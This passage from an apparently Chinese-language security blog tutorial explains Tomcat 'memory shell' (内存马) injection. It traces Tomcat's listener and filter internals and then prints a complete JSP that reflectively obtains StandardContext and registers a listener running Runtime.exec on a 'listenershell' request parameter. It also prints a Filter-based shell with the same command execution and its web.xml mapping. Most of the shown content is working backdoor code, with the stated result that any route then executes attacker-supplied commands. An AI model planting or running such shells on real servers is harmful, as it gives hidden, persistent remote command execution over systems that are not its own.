punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>进入fireRequestInitEvent中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">fireRequestInitEvent</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> instances <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>instances <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> instances<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">ServletRequestEvent</span> event <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletRequestEvent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> instances<span class="token punctuation">;</span>        <span class="token keyword">int</span> var5 <span class="token operator">=</span> instances<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var6 <span class="token operator">&lt;</span> var5<span class="token punctuation">;</span> <span class="token operator">++</span>var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">Object</span> instance <span class="token operator">=</span> var4<span class="token punctuation">[</span>var6<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> instance <span class="token keyword">instanceof</span> <span class="token class-name">ServletRequestListener</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">ServletRequestListener</span> listener <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ServletRequestListener</span><span class="token punctuation">)</span>instance<span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    listener<span class="token punctuation">.</span><span class="token function">requestInitialized</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token class-name">ExceptionUtils</span><span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"standardContext.requestListener.requestInit"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>instance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var10<span class="token punctuation">)</span><span class="token punctuation">;</span>                    request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"javax.servlet.error.exception"</span><span class="token punctuation">,</span> var10<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码中获得Listener的方法也是调用了getApplicationEventListeners来获取，然后遍历数组，当是要调用的事件型监听器时，用listener.requestInitialized(event)将其触发。</p><p>  现在知道Listener怎么存储了触发了，但我们还要知道如何添加Listener，这里说两种方案：</p><p>  第一种，通过setApplicationEventListeners将Listener添加到数组中。</p><p>  第二种，通过addApplicationEventListener方法来添加。</p><p>  不管哪种方案，第一步肯定是获得StandardContext类，在上面的调用栈中可以看到调用了StandardHostValve的invoke方法，我们看下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Request</span> request<span class="token punctuation">,</span> <span class="token class-name">Response</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>    <span class="token class-name">Context</span> context <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么我们也可以通过request来获取StandardContext。<br>获取后我们就分别说下添加Listener的两种方案：</p><p>  第一种，通过getApplicationEventListeners获取的StandardContext中的Listener数组，并将添加我们创建的listener进去，再setApplicationEventListeners数组即可：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objects <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> listeners <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>objects<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> listenershelllist <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span>listeners<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ListenerShell</span> listenershell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListenerShell</span><span class="token punctuation">;</span>   listenershelllist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>listenershell<span class="token punctuation">)</span><span class="token punctuation">;</span>   context<span class="token punctuation">.</span><span class="token function">setApplicationEventListeners</span><span class="token punctuation">(</span>listenershelllist<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  第二种，StandardContext中有addApplicationEventListener方法，可以直接添加Listener：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ListenerShell</span> listenershell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListenerShell</span><span class="token punctuation">;</span>   context<span class="token punctuation">.</span><span class="token function">addApplicationEventListener</span><span class="token punctuation">(</span>listenershell<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>附上第一种的完整代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.List"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Arrays"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.ArrayList"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token keyword">class</span> <span class="token class-name">ListenerMemShell</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> sre<span class="token punctuation">.</span><span class="token function">getServletRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> command <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"listenershell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">Field</span> reqF <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    reqF<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Request</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqF<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objects <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> listeners <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>objects<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> listenershelllist <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span>listeners<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ListenerMemShell</span> listenershell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListenerMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    listenershelllist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>listenershell<span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token punctuation">.</span><span class="token function">setApplicationEventListeners</span><span class="token punctuation">(</span>listenershelllist<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问jsp即注入成功后，任意路由?listenershell=command即可执行命令。</p><h2 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h2><p>  创建一个恶意Filter，恶意代码写再doFilter里：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FilterShell</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter初始化"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> command1 <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>command1 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在web.xml里配置：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>filter<span class="token punctuation">&gt;</span></span>    <span class="token operator">&lt;</span>filter<span class="token operator">-</span>name<span class="token operator">&gt;</span><span class="token class-name">FilterShell</span><span class="token operator">&lt;</span><span class="token operator">/</span>filter<span class="token operator">-</span>name<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>filter<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">&gt;</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span></span>Filter<span class="token punctuation">.</span>FilterShell</span><span class="token operator">&lt;</span><span class="token operator">/</span>filter<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>filter<span class="token operator">&gt;</span><span class="token operator">&lt;</span>filter<span class="token operator">-</span>mapping<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>filter<span class="token operator">-</span>name<span class="token operator">&gt;</span><span class="token class-name">FilterShell</span><span class="token operator">&lt;</span><span class="token operator">/</span>filter<span class="token operator">-</span>name<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>url<span class="token operator">-</span>pattern<span class="token operator">&gt;</span><span class="token comment">/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;/web-app&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在正式调试之前，有几个类需要简单知道一下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">FilterDef</span> 存储过滤器名filterName，过滤器实例filterClass，url 等基本信息<span class="token class-name">FilterConfigs</span>存储当前上下文信息<span class="token class-name">StandardContext</span>、<span class="token class-name">FilterDef</span> 和 <span class="token class-name">Filter</span>对象等信息<span class="token class-name">FilterMaps</span> 中主要存放了 <span class="token class-name">FilterName</span> 以及对应的<span class="token class-name">URLPattern</span><span class="token class-name">FilterChain</span>：过滤器链，该对象上的 doFilter 方法能依次调用链上的 <span class="token class-name">Filter</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们在doFilter处下断点，访问路由，查看调用栈：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">doFilter<span class="token operator">:</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token class-name">FilterShell</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span></span>Filter</span><span class="token punctuation">)</span>internalDoFilter<span class="token operator">:</span><span class="token number">189</span><span class="token punctuation">,</span> <span class="token class-name">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>doFilter<span class="token operator">:</span><span class="token number">162</span><span class="token punctuation">,</span> <span class="token class-name">ApplicationFilterChain</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">197</span><span class="token punctuation">,</span> <span class="token class-name">StandardWrapperValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token class-name">StandardContextValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">541</span><span class="token punctuation">,</span> <span class="token class-name">AuthenticatorBase</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>authenticator<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们看下ApplicationFilterChain：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">internalDoFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pos <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>filters<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">try</span> <span class="token punctuation">{</span>             <span class="token class-name">Filter</span> filter <span class="token operator">=</span> filterConfig<span class="token punctuation">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"false"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">.</span><span class="token function">getFilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.ASYNC_SUPPORTED"</span><span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Globals</span><span class="token punctuation">.</span>IS_SECURITY_ENABLED<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token class-name">Principal</span> principal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getUserPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                 <span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span><span class="token function">doAsPrivilege</span><span class="token punctuation">(</span><span class="token string">"doFilter"</span><span class="token punctuation">,</span> filter<span class="token punctuation">,</span> classType<span class="token punctuation">,</span> args<span class="token punctuation">,</span> principal<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                 filter<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ServletException</span> <span class="token operator">|</span> <span class="token class-name">RuntimeException</span> <span class="token operator">|</span> <span class="token class-name">IOException</span> var15<span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">throw</span> var15<span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var16<span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token class-name">Throwable</span> e <span class="token operator">=</span> <span class="token class-name">ExceptionUtils</span><span class="token punctuation">.</span><span class="token function">unwrapInvocationTargetException</span><span class="token punctuation">(</span>var16<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token class-name">ExceptionUtils</span><span class="token punctuation">.</span><span class="token function">handleThrowable</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"filterChain.filter"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token keyword">try</span> <span class="token punctuation">{</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationDispatcher</span><span class="token punctuation">.</span>WRAP_SAME_OBJECT<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 lastServicedRequest<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>                 lastServicedResponse<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span 